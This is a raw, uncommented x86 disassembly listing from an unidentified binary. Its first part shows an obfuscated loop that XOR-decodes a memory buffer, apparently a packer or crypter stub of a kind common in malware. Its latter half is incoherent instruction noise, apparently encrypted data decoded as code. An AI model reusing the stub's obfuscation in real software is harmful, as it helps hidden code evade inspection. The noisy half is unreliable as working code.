  40a6c9:	fmulp  st(6),st
  40a6cb:	cmp    al,0xaf
  40a6cd:	inc    ecx
  40a6ce:	xchg   edx,eax
  40a6cf:	mov    edx,0x4697005c
  40a6d4:	lahf   
  40a6d5:	dec    esi
  40a6d6:	int3   
  40a6d7:	mov    ecx,DWORD PTR ds:0xd6f302af
  40a6dd:	call   0x898f06c5
  40a6e2:	inc    ebp
  40a6e3:	or     bh,al
  40a6e5:	add    eax,0x42861f
  40a6ea:	sbb    al,BYTE PTR [eax]
  40a6ec:	add    BYTE PTR [eax],al
  40a6ee:	cmp    DWORD PTR ds:0x42861f,0x0
  40a6f5:	je     0x40a72f
  40a6fb:	cmp    DWORD PTR ds:0x42861f,0x24
  40a702:	jbe    0x40a72f
  40a708:	jmp    0x40a71d
  40a70d:	push   0x42862f
  40a712:	push   0x428042
  40a717:	call   DWORD PTR ds:0x4287cb
  40a71d:	mov    edx,DWORD PTR ds:0x42861f
  40a723:	dec    edx
  40a724:	mov    DWORD PTR ds:0x42861f,edx
  40a72a:	jmp    0x40a6ee
  40a72f:	mov    eax,DWORD PTR [ebp-0x24]
  40a732:	and    DWORD PTR ds:0x42866f,0x0
  40a73c:	jmp    0x40a74e
  40a741:	mov    edx,DWORD PTR ds:0x42866f
  40a747:	inc    edx
  40a748:	mov    DWORD PTR ds:0x42866f,edx
  40a74e:	cmp    DWORD PTR ds:0x42866f,0x17
  40a755:	jae    0x40a78b
  40a75b:	cmp    DWORD PTR ds:0x42866f,0x1b
  40a762:	jl     0x40a78b
  40a768:	jmp    0x40a786
  40a76d:	push   DWORD PTR [ebp-0x28]
  40a770:	push   DWORD PTR [ebp-0x18]
  40a773:	push   0x56d8
  40a778:	push   0x2d04
  40a77d:	push   DWORD PTR [ebp-0x10]
  40a780:	call   DWORD PTR ds:0x42879f
  40a786:	jmp    0x40a741
  40a78b:	mov    edx,DWORD PTR [ebp+0x8]
  40a78e:	xor    eax,ecx
  40a790:	add    eax,esi
  40a792:	cmp    edx,eax
  40a794:	mov    DWORD PTR ds:0x42860b,0x4a21
  40a79e:	jbe    0x40a816
  40a7a4:	mov    eax,DWORD PTR [ebp-0x24]
  40a7a7:	mov    DWORD PTR ds:0x428617,0x16
  40a7b1:	cmp    DWORD PTR ds:0x428617,0x0
  40a7b8:	je     0x40a809
  40a7be:	cmp    DWORD PTR ds:0x428617,0x4
  40a7c5:	ja     0x40a809
  40a7cb:	jmp    0x40a7db
  40a7d0:	push   0x5454
  40a7d5:	call   DWORD PTR ds:0x4287a3
  40a7db:	cmp    DWORD PTR ds:0x428617,0x5
  40a7e2:	jne    0x40a7f7
  40a7e8:	xor    edx,edx
  40a7ea:	add    edx,DWORD PTR ds:0x428617
  40a7f0:	dec    edx
  40a7f1:	mov    DWORD PTR ds:0x428617,edx
  40a7f7:	mov    edx,DWORD PTR ds:0x428617
  40a7fd:	dec    edx
  40a7fe:	mov    DWORD PTR ds:0x428617,edx
  40a804:	jmp    0x40a7b1
  40a809:	xor    eax,ecx
  40a80b:	add    eax,esi
  40a80d:	adc    edx,0x5d89
  40a813:	mov    DWORD PTR [ebp+0x8],eax
  40a816:	sub    edx,DWORD PTR ds:0x42867b
  40a81c:	mov    eax,DWORD PTR [ebp-0x28]
  40a81f:	mov    edx,DWORD PTR [ebp+0x8]
  40a822:	xor    eax,ecx
  40a824:	mov    DWORD PTR ds:0x428677,0x29fb
  40a82e:	add    eax,esi
  40a830:	sub    DWORD PTR ds:0x42865f,0x428667
  40a83a:	imul   eax,edx
  40a83d:	and    DWORD PTR ds:0x42866b,0x0
  40a847:	xor    edx,edx
  40a849:	xor    edx,DWORD PTR ds:0x42866b
  40a84f:	inc    edx
  40a850:	mov    DWORD PTR ds:0x42866b,edx
  40a856:	cmp    DWORD PTR ds:0x42866b,0x4
  40a85d:	jge    0x40a89f
  40a863:	jmp    0x40a876
  40a868:	push   DWORD PTR [ebp-0x1c]
  40a86b:	push   0x428034
  40a870:	call   DWORD PTR ds:0x4287a7
  40a876:	cmp    DWORD PTR ds:0x42866b,0x3
  40a87d:	jne    0x40a892
  40a883:	xor    edx,edx
  40a885:	xor    edx,DWORD PTR ds:0x42866b
  40a88b:	inc    edx
  40a88c:	mov    DWORD PTR ds:0x42866b,edx
  40a892:	cmp    DWORD PTR ds:0x42866b,0x10
  40a899:	jb     0x40a847
  40a89f:	mov    DWORD PTR [ebp+0x8],eax
  40a8a2:	mov    edx,DWORD PTR ds:0x428693
  40a8a8:	mov    edx,DWORD PTR [edx]
  40a8aa:	sbb    DWORD PTR ds:0x42861f,edx
  40a8b0:	mov    eax,DWORD PTR [ebp-0x14]
  40a8b3:	mov    edx,DWORD PTR [ebp+0x8]
  40a8b6:	xor    eax,ecx
  40a8b8:	add    eax,esi
  40a8ba:	cmp    edx,eax
  40a8bc:	je     0x40aa1e
  40a8c2:	mov    eax,DWORD PTR [ebp+0x8]
  40a8c5:	mov    DWORD PTR [ebp-0x20],eax
  40a8c8:	mov    eax,DWORD PTR [ebp-0x4]
  40a8cb:	add    eax,DWORD PTR [ebp-0x30]
  40a8ce:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  40a8d5:	mov    DWORD PTR [ebp-0x1c],edi
  40a8d8:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  40a8df:	mov    DWORD PTR [ebp-0x10],eax
  40a8e2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40a8e9:	mov    DWORD PTR [ebp-0xc],edi
  40a8ec:	mov    eax,DWORD PTR [ebp-0x2c]
  40a8ef:	xor    eax,ecx
  40a8f1:	add    eax,esi
  40a8f3:	jmp    0x40a9da
  40a8f8:	mov    DWORD PTR [ebp-0x38],0xf89c85bb
  40a8ff:	mov    DWORD PTR [ebp-0x3c],0xf89c858e
  40a906:	mov    eax,DWORD PTR [ebp-0xc]
  40a909:	mov    edx,DWORD PTR [ebp+0x8]
  40a90c:	xor    eax,ecx
  40a90e:	add    eax,esi
  40a910:	imul   eax,edx
  40a913:	mov    edx,DWORD PTR [ebp-0x10]
  40a916:	mov    al,BYTE PTR [eax+edx*1]
  40a919:	mov    BYTE PTR [ebp+0xf],al
  40a91c:	mov    eax,DWORD PTR [ebp-0xc]
  40a91f:	mov    edx,DWORD PTR [ebp+0x8]
  40a922:	xor    eax,ecx
  40a924:	add    eax,esi
  40a926:	imul   eax,edx
  40a929:	mov    edx,DWORD PTR [ebp-0x34]
  40a92c:	xor    edx,ecx
  40a92e:	add    eax,edx
  40a930:	mov    edx,DWORD PTR [ebp-0x10]
  40a933:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a93b:	mov    edx,DWORD PTR [ebp-0x38]
  40a93e:	xor    edx,ecx
  40a940:	lea    eax,[edx+eax*1+0x3272ec]
  40a947:	movzx  edx,BYTE PTR [ebp+0xf]
  40a94b:	xor    edx,eax
  40a94d:	mov    BYTE PTR [ebp+0xf],dl
  40a950:	mov    al,BYTE PTR [ebp+0xf]
  40a953:	mov    edx,DWORD PTR [ebp-0xc]
  40a956:	mov    ebx,DWORD PTR [ebp+0x8]
  40a959:	xor    edx,ecx
  40a95b:	add    edx,esi
  40a95d:	imul   edx,ebx
  40a960:	mov    ebx,DWORD PTR [ebp-0x10]
  40a963:	mov    BYTE PTR [edx+ebx*1],al
  40a966:	mov    eax,DWORD PTR [ebp-0xc]
  40a969:	mov    edx,DWORD PTR [ebp+0x8]
  40a96c:	xor    eax,ecx
  40a96e:	add    eax,esi
  40a970:	imul   eax,edx
  40a973:	mov    edx,DWORD PTR [ebp-0x10]
  40a976:	mov    al,BYTE PTR [eax+edx*1]
  40a979:	mov    BYTE PTR [ebp+0xf],al
  40a97c:	mov    eax,DWORD PTR [ebp-0xc]
  40a97f:	mov    edx,DWORD PTR [ebp+0x8]
  40a982:	xor    eax,ecx
  40a984:	add    eax,esi
  40a986:	imul   eax,edx
  40a989:	mov    edx,DWORD PTR [ebp-0x1c]
  40a98c:	xor    edx,ecx
  40a98e:	add    eax,edx
  40a990:	mov    edx,DWORD PTR [ebp-0x10]
  40a993:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a99b:	mov    edx,DWORD PTR [ebp-0x3c]
  40a99e:	xor    edx,ecx
  40a9a0:	lea    eax,[edx+eax*1+0x3272ec]
  40a9a7:	movzx  edx,BYTE PTR [ebp+0xf]
  40a9ab:	xor    edx,eax
  40a9ad:	mov    BYTE PTR [ebp+0xf],dl
  40a9b0:	mov    al,BYTE PTR [ebp+0xf]
  40a9b3:	mov    edx,DWORD PTR [ebp-0xc]
  40a9b6:	mov    ebx,DWORD PTR [ebp+0x8]
  40a9b9:	xor    edx,ecx
  40a9bb:	add    edx,esi
  40a9bd:	imul   edx,ebx
  40a9c0:	mov    ebx,DWORD PTR [ebp-0x10]
  40a9c3:	mov    BYTE PTR [edx+ebx*1],al
  40a9c6:	mov    eax,DWORD PTR [ebp-0x40]
  40a9c9:	mov    edx,DWORD PTR [ebp-0x1c]
  40a9cc:	xor    eax,ecx
  40a9ce:	xor    edx,ecx
  40a9d0:	add    eax,esi
  40a9d2:	add    edx,esi
  40a9d4:	imul   eax,edx
  40a9d7:	add    eax,DWORD PTR [ebp+0x8]
  40a9da:	mov    DWORD PTR [ebp+0x8],eax
  40a9dd:	mov    eax,DWORD PTR [ebp+0x8]
  40a9e0:	mov    edx,DWORD PTR [ebp-0x20]
  40a9e3:	cmp    edx,eax
  40a9e5:	jb     0x40a8f8
  40a9eb:	mov    eax,DWORD PTR [ebp-0x1c]
  40a9ee:	mov    edx,DWORD PTR [ebp-0x20]
  40a9f1:	xor    eax,ecx
  40a9f3:	add    eax,esi
  40a9f5:	imul   eax,edx
  40a9f8:	mov    edx,DWORD PTR [ebp-0x2c]
  40a9fb:	xor    edx,ecx
  40a9fd:	add    edx,esi
  40a9ff:	or     eax,edx
  40aa01:	mov    edx,DWORD PTR [ebp-0x8]
  40aa04:	xor    edx,ecx
  40aa06:	add    eax,edx
  40aa08:	mov    edx,DWORD PTR [ebp-0x8]
  40aa0b:	xor    edx,ecx
  40aa0d:	add    eax,edx
  40aa0f:	mov    edx,DWORD PTR [ebp-0x4]
  40aa12:	lea    eax,[eax+edx*1+0x64e5d8]
  40aa19:	jmp    0x40aa2d
  40aa1e:	mov    eax,DWORD PTR [ebp-0x8]
  40aa21:	mov    edx,DWORD PTR [ebp-0x4]
  40aa24:	xor    eax,ecx
  40aa26:	lea    eax,[eax+edx*1+0x3272ec]
  40aa2d:	mov    DWORD PTR [ebp-0x4],eax
  40aa30:	mov    eax,DWORD PTR [ebp-0x8]
  40aa33:	xor    eax,ecx
  40aa35:	mov    edx,0xffcd8d14
  40aa3a:	sub    edx,eax
  40aa3c:	add    edx,DWORD PTR [ebp-0x18]
  40aa3f:	mov    eax,DWORD PTR [ebp-0x8]
  40aa42:	mov    ebx,DWORD PTR [ebp-0x4]
  40aa45:	xor    eax,ecx
  40aa47:	add    eax,esi
  40aa49:	imul   eax,ebx
  40aa4c:	cmp    eax,edx
  40aa4e:	jbe    0x4082fa
  40aa54:	pop    ebx
  40aa55:	pop    edi
  40aa56:	pop    esi
  40aa57:	leave  
  40aa58:	ret    0x8
  40aa5b:	push   ebp
  40aa5c:	mov    ebp,esp
  40aa5e:	sub    esp,0x10
  40aa61:	mov    eax,ds:0x4286a3
  40aa66:	mov    ecx,DWORD PTR ds:0x428727
  40aa6c:	sub    ecx,eax
  40aa6e:	add    eax,DWORD PTR [eax+ecx*1]
  40aa71:	mov    eax,0xf89c85b0
  40aa76:	mov    DWORD PTR [ebp-0x4],eax
  40aa79:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40aa80:	mov    edx,DWORD PTR ds:0x4286db
  40aa86:	xor    ecx,ecx
  40aa88:	or     ecx,DWORD PTR ds:0x428717
  40aa8e:	sub    ecx,edx
  40aa90:	xor    edx,DWORD PTR [edx+ecx*1]
  40aa93:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa96:	or     edx,0x191e
  40aa9c:	push   esi
  40aa9d:	and    DWORD PTR ds:0x4285db,0x0
  40aaa7:	mov    edx,DWORD PTR ds:0x4285db
  40aaad:	inc    edx
  40aaae:	mov    DWORD PTR ds:0x4285db,edx
  40aab4:	cmp    DWORD PTR ds:0x4285db,0x1e
  40aabb:	jl     0x40aae5
  40aac1:	jmp    0x40aad8
  40aac6:	push   0x428028
  40aacb:	push   0x1
  40aacd:	push   0x77f2
  40aad2:	call   DWORD PTR ds:0x4287ab
  40aad8:	cmp    DWORD PTR ds:0x4285db,0x13
  40aadf:	jb     0x40aaa7
  40aae5:	mov    edx,0x75108a4
  40aaea:	sbb    esi,0x397d
  40aaf0:	xor    ecx,edx
  40aaf2:	and    DWORD PTR ds:0x42866f,0x0
  40aafc:	xor    esi,esi
  40aafe:	add    esi,DWORD PTR ds:0x42866f
  40ab04:	inc    esi
  40ab05:	mov    DWORD PTR ds:0x42866f,esi
  40ab0b:	cmp    DWORD PTR ds:0x42866f,0x21
  40ab12:	jge    0x40ceb9
  40ab18:	jmp    0x40ab28
  40ab1d:	push   0x42801b
  40ab22:	call   DWORD PTR ds:0x4287af
  40ab28:	cmp    DWORD PTR ds:0x42866f,0x1c
  40ab2f:	jb     0x40aafc
  40ab35:	jmp    0x40ceb9
  40ab3a:	jo     0x40aaf5
  40ab3c:	aam    0x1d
  40ab3e:	mov    DWORD PTR [ebx],0xd07b7bab
  40ab44:	xor    DWORD PTR [ecx],edx
  40ab46:	xchg   edx,eax
  40ab47:	push   ecx
  40ab48:	jecxz  0x40aad2
  40ab4a:	adc    al,0xe8
  40ab4c:	jp     0x40abc8
  40ab4e:	adc    ebx,DWORD PTR [edi+0x7a]
  40ab51:	jp     0x40aaf1
  40ab53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab54:	movlps QWORD PTR [esi+ebx*2+0x3d],xmm0
  40ab59:	xor    al,0xc6
  40ab5b:	pusha  
  40ab5c:	call   0x20a0:0xd5f54855
  40ab63:	jb     0x40aba6
  40ab65:	sbb    BYTE PTR [edx+0x5cf51e68],ch
  40ab6b:	xchg   esi,eax
  40ab6c:	loopne 0x40abbb
  40ab6e:	inc    edi
  40ab6f:	xor    eax,0x5245bb1e
  40ab74:	pop    ecx
  40ab75:	lea    ebp,[ebx-0x2c]
  40ab78:	xchg   ch,al
  40ab7a:	jns    0x40ab50
  40ab7c:	shr    dh,cl
  40ab7e:	lea    ecx,[edx-0x75]
  40ab81:	xor    BYTE PTR [eax],ch
  40ab83:	test   BYTE PTR cs:[edx],bl
  40ab86:	cmp    al,0xaa
  40ab88:	icebp  
  40ab89:	jg     0x40abd8
  40ab8b:	jbe    0x40aba4
  40ab8d:	sbb    esp,DWORD PTR [ebp-0x483ee0ab]
  40ab93:	lods   eax,DWORD PTR ds:[esi]
  40ab94:	mov    bl,0xdb
  40ab96:	ret    
  40ab97:	cmp    esi,DWORD PTR [edx-0x3008918f]
  40ab9d:	enter  0xe9b9,0xeb
  40aba1:	push   ebp
  40aba2:	cmp    BYTE PTR [edx+0x4],ah
  40aba5:	in     al,dx
  40aba6:	ret    
  40aba7:	in     al,0xeb
  40aba9:	test   eax,0x873eb73c
  40abae:	mov    dh,0x7c
  40abb0:	mov    ah,0xeb
  40abb2:	adc    ch,ah
  40abb4:	fild   DWORD PTR [edi-0x7857bc35]
  40abba:	dec    ecx
  40abbb:	inc    esp
  40abbc:	mov    edx,0x149ac6f4
  40abc1:	lea    esp,[ebp+0x16de3183]
  40abc7:	(bad)  
  40abc8:	sbb    BYTE PTR [edx-0xd],ah
  40abcb:	retf   
  40abcc:	or     al,0xa7
  40abce:	call   0x7a37:0xd63df5f8
  40abd5:	imul   esp,ebx,0x78594117
  40abdb:	push   ss
  40abdc:	mov    eax,ds:0xfb22091c
  40abe1:	bound  ebp,QWORD PTR [ebx+0x4ae435f1]
  40abe7:	iret   
  40abe8:	enter  0xfdba,0x20
  40abec:	loope  0x40ac3e
  40abee:	(bad)  
  40abef:	out    dx,al
  40abf0:	mov    ch,BYTE PTR [ebp-0x11]
  40abf3:	repz ror DWORD PTR [eax],cl
  40abf6:	xor    eax,0xc446efd1
  40abfb:	jno    0x40ac66
  40abfd:	loope  0x40abc0
  40abff:	or     eax,edx
  40ac01:	cwde   
  40ac02:	mov    ch,0x43
  40ac04:	rcr    ecx,cl
  40ac06:	jmp    0x40abf5
  40ac08:	push   0x7c6f225b
  40ac0d:	shl    eax,0x6b
  40ac10:	fsub   st(5),st
  40ac12:	into   
  40ac13:	cmp    eax,0x50bb166e
  40ac18:	push   ds
  40ac19:	imul   eax,DWORD PTR [ebx-0x1b],0x14ca38c3
  40ac20:	xchg   ebp,ebp
  40ac22:	inc    edx
  40ac23:	dec    edi
  40ac24:	and    eax,0xd6f5aa92
  40ac29:	div    ecx
  40ac2b:	fdivr  QWORD PTR [eax-0x32]
  40ac2e:	cmp    BYTE PTR [ebp-0x6ba1c09c],0xeb
  40ac35:	(bad)  
  40ac36:	xchg   edx,eax
  40ac37:	(bad)  
  40ac38:	cmp    DWORD PTR [edi],edi
  40ac3a:	dec    edx
  40ac3b:	cmovb  esp,eax
  40ac3e:	nop
  40ac3f:	cli    
  40ac40:	pop    edi
  40ac41:	lahf   
  40ac42:	hlt    
  40ac43:	add    ah,0xc9
  40ac46:	xchg   edi,eax
  40ac47:	mov    ecx,0x9c282d35
  40ac4c:	jbe    0x40ac78
  40ac4e:	icebp  
  40ac4f:	ret    
  40ac50:	inc    ecx
  40ac51:	(bad)  
  40ac52:	rcl    DWORD PTR [ecx-0x4076e8fb],cl
  40ac58:	adc    ebx,DWORD PTR [ecx-0x16]
  40ac5b:	mov    dl,0x8e
  40ac5d:	shl    DWORD PTR [edx+0x56],cl
  40ac60:	dec    esp
  40ac61:	sub    ebx,DWORD PTR [eax+0x45]
  40ac64:	dec    ebx
  40ac65:	cmp    eax,0x5c95148a
  40ac6a:	int    0x11
  40ac6c:	mov    cl,0xee
  40ac6e:	push   esp
  40ac6f:	add    al,0xee
  40ac71:	(bad)  
  40ac72:	pop    esp
  40ac73:	outs   dx,DWORD PTR ds:[esi]
  40ac74:	jbe    0x40acdc
  40ac76:	jae    0x40acc4
  40ac78:	outs   dx,BYTE PTR ds:[esi]
  40ac79:	popa   
  40ac7a:	inc    ebx
  40ac7b:	pushf  
  40ac7c:	and    ah,al
  40ac7e:	dec    esi
  40ac7f:	fs call 0x51dffd00
  40ac85:	pop    eax
  40ac86:	sbb    al,BYTE PTR [esi]
  40ac88:	push   cs
  40ac89:	add    eax,0x71acf1fe
  40ac8e:	push   0x1a381c24
  40ac93:	dec    esp
  40ac94:	sub    DWORD PTR [edx+0x7b],edx
  40ac97:	in     al,dx
  40ac98:	jmp    0x451c:0xf5a1c8c3
  40ac9f:	aad    0xe0
  40aca1:	dec    esi
  40aca2:	rcl    ebp,1
  40aca4:	test   BYTE PTR [edx+edi*8],ch
  40aca7:	pop    ebp
  40aca8:	out    dx,eax
  40aca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acaa:	pop    eax
  40acab:	popa   
  40acac:	mov    ch,0x10
  40acae:	in     eax,dx
  40acaf:	inc    eax
  40acb0:	lock iret 
  40acb2:	pop    edi
  40acb3:	mov    eax,0x4de29c2c
  40acb8:	adc    eax,DWORD PTR [edi+ebx*4-0x72]
  40acbc:	xchg   edi,eax
  40acbd:	lds    ebp,FWORD PTR [ebx+0x210f9568]
  40acc3:	cmovp  ecx,ebp
  40acc6:	xchg   ecx,eax
  40acc7:	xchg   edx,eax
  40acc8:	xchg   ecx,eax
  40acc9:	test   edi,edi
  40accb:	inc    BYTE PTR [esi]
  40accd:	xor    BYTE PTR [edx-0x6b],ah
  40acd0:	cmp    eax,0xce1e83d5
  40acd5:	pop    eax
  40acd6:	js     0x40accf
  40acd8:	fstp   TBYTE PTR [ebp+edi*4-0x4a]
  40acdc:	pop    esp
  40acdd:	les    ebp,FWORD PTR [eax-0x8]
  40ace0:	push   edi
  40ace1:	xchg   ebp,eax
  40ace2:	mov    dl,0x7a
  40ace4:	dec    esp
  40ace5:	(bad)  
  40ace6:	icebp  
  40ace7:	xor    cl,BYTE PTR [eax+0x2d3a1c1]
  40aced:	jge    0x40ad06
  40acef:	and    BYTE PTR [eax-0x3b77f7a],ch
  40acf5:	scas   eax,DWORD PTR es:[edi]
  40acf6:	retf   0x580
  40acf9:	sub    al,0xfa
  40acfb:	dec    esi
  40acfc:	adc    al,0xe3
  40acfe:	sbb    edx,DWORD PTR [ebx+0x793039a2]
  40ad04:	jmp    0xdc9b:0xb1991ae2
  40ad0b:	in     eax,dx
  40ad0c:	fstp   QWORD PTR [ebx+0x4a2f34bb]
  40ad12:	cdq    
  40ad13:	sti    
  40ad14:	nop
  40ad15:	ins    BYTE PTR es:[edi],dx
  40ad16:	jmp    0x40ad3e
  40ad18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad19:	lods   al,BYTE PTR ds:[esi]
  40ad1a:	test   DWORD PTR [eax-0x28],ecx
  40ad1d:	sub    BYTE PTR [eax+0x1a64db2],cl
  40ad23:	inc    edi
  40ad24:	mov    dl,0xa1
  40ad26:	xchg   BYTE PTR [edi],bh
  40ad28:	ins    BYTE PTR es:[edi],dx
  40ad29:	jmp    0x6933:0x2d01d5e5
  40ad30:	sbb    DWORD PTR [ebx+0x7a],0x1b68c47e
  40ad37:	sbb    DWORD PTR [esi+0x20],esi
  40ad3a:	jge    0x40acd2
  40ad3c:	jno    0x40ad12
  40ad3e:	shl    BYTE PTR fs:[eax+ebp*4-0x606dd34],1
  40ad46:	test   al,0x5b
  40ad48:	jo     0x40ad89
  40ad4a:	xor    dl,BYTE PTR [ebx-0x387a645e]
  40ad50:	mov    WORD PTR [ecx+0x63da2b54],fs
  40ad56:	add    al,0x6a
  40ad58:	jns    0x40ad4b
  40ad5a:	dec    ebp
  40ad5b:	cli    
  40ad5c:	dec    edx
  40ad5d:	sbb    DWORD PTR [ebx-0x49],ebp
  40ad60:	pop    es
  40ad61:	push   edx
  40ad62:	lods   eax,DWORD PTR ds:[esi]
  40ad63:	sti    
  40ad64:	add    ch,cl
  40ad66:	jmp    0x40ad2a
  40ad68:	adc    eax,0x6c3fa158
  40ad6d:	mov    dl,0xb8
  40ad6f:	inc    esi
  40ad70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad71:	mov    cl,0xaf
  40ad73:	push   ebp
  40ad74:	scas   eax,DWORD PTR es:[edi]
  40ad75:	(bad)  
  40ad76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad77:	retf   0x4bb4
  40ad7a:	pushf  
  40ad7b:	xor    ch,BYTE PTR [ecx-0x1a]
  40ad7e:	push   ebp
  40ad7f:	div    DWORD PTR [esp+ebx*4+0x71]
  40ad83:	adc    eax,0x71374515
  40ad88:	push   edx
  40ad89:	jmp    0x40ade0
  40ad8b:	push   0x1a55bb65
  40ad90:	cwde   
  40ad91:	push   cs
  40ad92:	xor    esp,esi
  40ad94:	xchg   esp,eax
  40ad95:	xor    eax,0xe672c7b4
  40ad9a:	pop    ebp
  40ad9b:	push   edi
  40ad9c:	dec    esi
  40ad9d:	xor    al,0xf0
  40ad9f:	fidiv  WORD PTR [ebp+edx*1+0x6b]
  40ada3:	test   DWORD PTR [edi-0x4500c9f7],ebx
  40ada9:	sub    BYTE PTR [esi+0x3fd35ec5],ah
  40adaf:	ror    BYTE PTR [edx+0x6ccc84bf],cl
  40adb5:	lods   eax,DWORD PTR ds:[esi]
  40adb6:	test   DWORD PTR [ebx+eax*8+0x42381b3e],0xacbef24c
  40adc1:	clc    
  40adc2:	jg     0x40ad84
  40adc4:	mov    bh,0x96
  40adc6:	mov    esi,0x911cdfab
  40adcb:	je     0x40adcc
  40adcd:	mov    ds:0x3fcf5529,eax
  40add2:	(bad)  
  40add3:	cs mov ch,0xc8
  40add6:	or     ebp,DWORD PTR [esi+0x61e4216c]
  40addc:	xchg   edx,eax
  40addd:	mov    dl,0x12
  40addf:	pop    es
  40ade0:	mov    dl,0xe9
  40ade2:	cmp    al,0x6b
  40ade4:	int    0xa0
  40ade6:	push   0x915d6724
  40adeb:	hlt    
  40adec:	mov    ds:0x5d10913a,al
  40adf1:	xchg   BYTE PTR [ebx+0x2454dd1f],dh
  40adf7:	std    
  40adf8:	mov    al,0x5a
  40adfa:	xlat   BYTE PTR ds:[ebx]
  40adfb:	call   0xfe45:0xd4a65982
  40ae02:	sbb    al,0x52
  40ae04:	push   es
  40ae05:	ja     0x40ae31
  40ae07:	icebp  
  40ae08:	xchg   ebx,eax
  40ae09:	lock xchg BYTE PTR cs:[edx-0x7e],bh
  40ae0e:	or     BYTE PTR [ecx+0x6d],cl
  40ae11:	stos   DWORD PTR es:[edi],eax
  40ae12:	in     eax,dx
  40ae13:	mov    eax,0xe9760ae
  40ae18:	arpl   WORD PTR [ecx-0x128a01dc],bx
  40ae1e:	popa   
  40ae1f:	push   es
  40ae20:	mov    bh,0xb8
  40ae22:	or     eax,0x4a91eb1f
  40ae27:	sahf   
  40ae28:	push   esp
  40ae29:	int3   
  40ae2a:	aam    0xd0
  40ae2c:	(bad)  
  40ae2d:	ins    DWORD PTR es:[edi],dx
  40ae2e:	pop    ebx
  40ae2f:	stc    
  40ae30:	pop    ss
  40ae31:	stos   BYTE PTR es:[edi],al
  40ae32:	mov    bl,0xff
  40ae34:	adc    eax,0xf7e9df52
  40ae39:	cli    
  40ae3a:	xchg   DWORD PTR [ebx-0x6368044b],edx
  40ae40:	dec    esi
  40ae41:	or     al,0x9c
  40ae43:	cs and edi,esp
  40ae46:	pushf  
  40ae47:	xor    eax,0x809e5ac0
  40ae4c:	add    eax,0xe9610dc9
  40ae51:	lahf   
  40ae52:	hlt    
  40ae53:	mov    ch,0x0
  40ae55:	cdq    
  40ae56:	in     al,0x67
  40ae58:	mov    eax,ds:0x2fa3a9d6
  40ae5d:	fwait
  40ae5e:	jns    0x40ae1c
  40ae60:	dec    edi
  40ae61:	adc    BYTE PTR cs:[esi+0x740241a5],dh
  40ae68:	and    BYTE PTR [ebx+edi*4+0x5e],bh
  40ae6c:	cdq    
  40ae6d:	in     eax,0xd9
  40ae6f:	sub    al,0xf
  40ae71:	das    
  40ae72:	pop    es
  40ae73:	ficom  DWORD PTR [eax]
  40ae75:	(bad)
  40ae78:	outs   dx,DWORD PTR ds:[esi]
  40ae79:	cmp    eax,0x5d460a1c
  40ae7e:	and    al,0xa4
  40ae80:	add    BYTE PTR [esi],ah
  40ae82:	arpl   WORD PTR [ecx+0x69c6c041],bp
  40ae88:	test   DWORD PTR [edi-0x1b],ecx
  40ae8b:	aad    0x71
  40ae8d:	repz stc 
  40ae8f:	add    DWORD PTR [eax],eax
  40ae91:	addr16 ds push edx
  40ae94:	xor    esp,DWORD PTR [ecx+ecx*2-0x4c]
  40ae98:	jns    0x40aec1
  40ae9a:	(bad)  
  40ae9b:	shl    DWORD PTR [ecx],cl
  40ae9d:	call   ebx
  40ae9f:	cmp    ch,0x2c
  40aea2:	call   0xf646:0xe18753a6
  40aea9:	or     eax,0xfb6f4534
  40aeae:	cwde   
  40aeaf:	enter  0x3afe,0x37
  40aeb3:	mov    cs,eax
  40aeb5:	ret    
  40aeb6:	mov    dl,0x2
  40aeb8:	xchg   esi,esi
  40aeba:	add    edi,edi
  40aebc:	dec    ebp
  40aebd:	sub    DWORD PTR [ebp-0x73],edi
  40aec0:	clc    
  40aec1:	ins    DWORD PTR es:[edi],dx
  40aec2:	ret    0x3849
  40aec5:	mov    ebp,0x77da5586
  40aeca:	pop    ebx
  40aecb:	pop    eax
  40aecc:	ficom  DWORD PTR [eax-0x6b]
  40aecf:	inc    ecx
  40aed0:	test   BYTE PTR [ecx-0x1a],dh
  40aed3:	xor    eax,0x1b56a21e
  40aed8:	adc    DWORD PTR [edx+0x41],0x5156ce86
  40aedf:	lahf   
  40aee0:	mov    eax,ds:0x25cb2e7a
  40aee5:	lock jle 0x40af2b
  40aee8:	lock arpl WORD PTR [ecx+0x74],bp
  40aeec:	xchg   DWORD PTR [esi+0x651c5143],ebx
  40aef2:	or     al,0x61
  40aef4:	add    al,0xd3
  40aef6:	(bad)  
  40aef8:	jecxz  0x40af6e
  40aefa:	aaa    
  40aefb:	ffree  st(5)
  40aefd:	jno    0x40af11
  40aeff:	mov    al,ds:0xde212e3a
  40af04:	xchg   ebp,eax
  40af05:	ins    BYTE PTR es:[edi],dx
  40af06:	(bad)  
  40af07:	jmp    0x65a2629c
  40af0c:	jle    0x40af6d
  40af0e:	mov    WORD PTR [ebp+0x35995d1],ds
  40af14:	aam    0x44
  40af16:	sbb    al,0x30
  40af18:	std    
  40af19:	xchg   ebx,eax
  40af1a:	(bad)  
  40af1b:	es jo  0x40af9b
  40af1e:	fadd   DWORD PTR [esp+eiz*4-0x3aa4587]
  40af25:	stos   BYTE PTR es:[edi],al
  40af26:	and    eax,0xe673a65b
  40af2b:	in     eax,0xff
  40af2d:	iret   
  40af2e:	arpl   si,cx
  40af30:	xor    DWORD PTR [esp+esi*2-0x1e20ef1c],eax
  40af37:	icebp  
  40af38:	and    eax,0x522f9237
  40af3d:	int3   
  40af3e:	outs   dx,DWORD PTR ds:[esi]
  40af3f:	push   ecx
  40af40:	call   0x23d0:0x8c7642bc
  40af47:	sbb    dl,al
  40af49:	mov    eax,ds:0x394150ea
  40af4e:	cmp    ah,BYTE PTR [edx]
  40af50:	int    0x11
  40af52:	sbb    bh,bl
  40af54:	dec    edi
  40af55:	xchg   DWORD PTR [ecx],ecx
  40af57:	pop    esp
  40af58:	add    dl,al
  40af5a:	pop    es
